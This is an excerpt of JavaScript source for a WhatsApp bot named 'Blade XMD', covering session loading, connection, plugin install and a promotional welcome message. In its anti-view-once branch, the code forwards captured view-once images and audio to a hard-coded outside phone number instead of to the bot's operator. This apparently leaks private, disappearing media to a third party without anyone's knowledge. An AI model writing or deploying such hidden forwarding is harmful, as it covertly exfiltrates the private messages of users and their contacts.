...
const sessdata = config.SESSION_ID.replace("Blade~", '');
...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting blade xmd to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing blade xmd Plugins')
  const path = require('path');
  ...
  let up = `*Hello there ✦ MR ✦ BLADE ✦ XMD ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by Ald hassan \ud83c\udf8a, Meet ✦ Mr ✦ Blade ✦ XMD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ BLADE ✦ XMD ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VaAkETLLY6d8qhLmZt2v\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/SilvaTechB/silva-spark-md\n\n> © Powered BY ✦ MR ✦ BLADE ✦ XMD ✦ \ud83d\udda4`;
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("243829465643@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("243829465643@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
